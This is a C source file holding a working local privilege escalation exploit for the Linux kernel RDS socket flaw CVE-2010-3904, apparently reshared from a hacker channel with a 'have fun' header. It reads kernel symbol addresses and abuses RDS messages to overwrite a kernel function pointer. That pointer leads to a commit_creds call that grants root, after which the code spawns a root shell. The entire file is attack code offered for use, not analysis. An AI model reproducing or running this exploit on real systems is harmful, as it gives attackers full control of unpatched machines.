/*
 * Linux Kernel <= 2.6.36-rc8 RDS privilege escalation exploit CVE-2010-3904
 * *unfucked by xd #haxnet
 * *Notes: http://oss.oracle.com/pipermail/rds-devel/2007-October/000112.html
 * *compile with gcc rdsx.s -o rds && have fun!
 */
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <sys/utsname.h>

#define RECVPORT 5111
#define SENDPORT 6111

#define PF_RDS AF_RDS
#define AF_RDS 21

int prep_sock(int port) {
int s, ret;
struct sockaddr_in addr;
s = socket(PF_RDS, SOCK_STREAM, 0); // try UDP here too as it is also confirmed to trigger the xpl
if(s < 0) {
printf("[*] Could not open socket.\n");
exit(-1);
}
memset(&addr, 0, sizeof(addr));
addr.sin_addr.s_addr = inet_addr("127.0.0.1");
addr.sin_family = AF_INET;
addr.sin_port = htons(port);
ret = bind(s, (struct sockaddr *)&addr, sizeof(addr));
if(ret < 0) {
printf("[*] Could not bind socket.\n");
exit(-1);
}
return s;
}

void get_message(unsigned long address, int sock) {
recvfrom(sock, (void *)address, sizeof(void *), 0,NULL, NULL);
}

void send_message(unsigned long value, int sock) {
int size, ret;
struct sockaddr_in recvaddr;
struct msghdr msg;
struct iovec iov;
unsigned long buf;
memset(&recvaddr, 0, sizeof(recvaddr));
size = sizeof(recvaddr);
recvaddr.sin_port = htons(RECVPORT);
recvaddr.sin_family = AF_INET;
recvaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
memset(&msg, 0, sizeof(msg));
msg.msg_name = &recvaddr;
msg.msg_namelen = sizeof(recvaddr);
msg.msg_iovlen = 1;
buf = value;
iov.iov_len = sizeof(buf);
iov.iov_base = &buf;
msg.msg_iov = &iov;
ret = sendmsg(sock, &msg, 0);
if(ret < 0) {
printf("[*] Something went wrong sending.\n");
exit(-1);
}
}

void write_to_mem(unsigned long addr, unsigned long value, int sendsock, int recvsock) {
if(!fork()) {
sleep(1);
send_message(value, sendsock);
exit(1);
} else {
get_message(addr, recvsock);
wait(NULL);
}
}

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

int __attribute__((regparm(3)))
getroot(void * file, void * vma) {
commit_creds(prepare_kernel_cred(0));
return -1;
}

unsigned long get_kernel_sym(char *name) {
    FILE *f;
    unsigned long addr;
    char dummy;
    char sname[512];
    struct utsname ver;
    int ret;
    int rep = 0;
    int oldstyle = 0;
    f = fopen("/proc/kallsyms", "r");
    if (f == NULL) {
        f = fopen("/proc/ksyms", "r");
        if (f == NULL)
            goto fallback;
        oldstyle = 1;
    }
repeat:
    ret = 0;
    while(ret != EOF) {
        if (!oldstyle)
            ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
        else {
            ret = fscanf(f, "%p %s\n", (void **)&addr, sname);
            if (ret == 2) {
                char *p;
                if (strstr(sname, "_O/") || strstr(sname, "_S."))
                    continue;
                p = strrchr(sname, '_');
                if (p > ((char *)sname + 5) && !strncmp(p - 3, "smp", 3)) {
                    p = p - 4;
                    while (p > (char *)sname && *(p - 1) == '_')
                        p--;
                    *p = '\0';
                }
            }
        }
        if (ret == 0) {
            fscanf(f, "%s\n", sname);
            continue;
        }
        if (!strcmp(name, sname)) {
            fclose(f);
            return addr;
        }
    }
    fclose(f);
    if (rep)
        return 0;
fallback:
    uname(&ver);
    if (strncmp(ver.release, "2.6", 3))
    oldstyle = 1;
    sprintf(sname, "/boot/System.map-%s", ver.release);
    f = fopen(sname, "r");
    if (f == NULL)
    return 0;
    rep = 1;
    goto repeat;
}

int main(int argc, char * argv[]) {
unsigned long sock_ops, rds_ioctl, target;
int sendsock, recvsock;
struct utsname ver;
printf("[*] Linux kernel >= 2.6.30 RDS socket exploit\n");
sendsock = prep_sock(SENDPORT);
recvsock = prep_sock(RECVPORT);
printf("[*] Resolving kernel addresses...\n");
sock_ops = get_kernel_sym("rds_proto_ops");
rds_ioctl = get_kernel_sym("rds_ioctl");
commit_creds = (_commit_creds) get_kernel_sym("commit_creds");
prepare_kernel_cred = (_prepare_kernel_cred) get_kernel_sym("prepare_kernel_cred");
if(!sock_ops || !rds_ioctl || !commit_creds || !prepare_kernel_cred) {
printf("[*] Failed to resolve kernel symbols.\n");
return -1;
}
target = sock_ops + 9 * sizeof(void *);
printf("[*] Overwriting function pointer...\n");
write_to_mem(target, (unsigned long)&getroot, sendsock, recvsock);
printf("[*] Triggering payload...\n");
ioctl(sendsock, 0, NULL);
printf("[*] Restoring function pointer...\n");
write_to_mem(target, rds_ioctl, sendsock, recvsock);
if(getuid()) {
printf("[*] Exploit failed to get root.\n");
return -1;
}
printf("[*] Got toot\n");
execl("/bin/sh", "/bin/sh", NULL);
}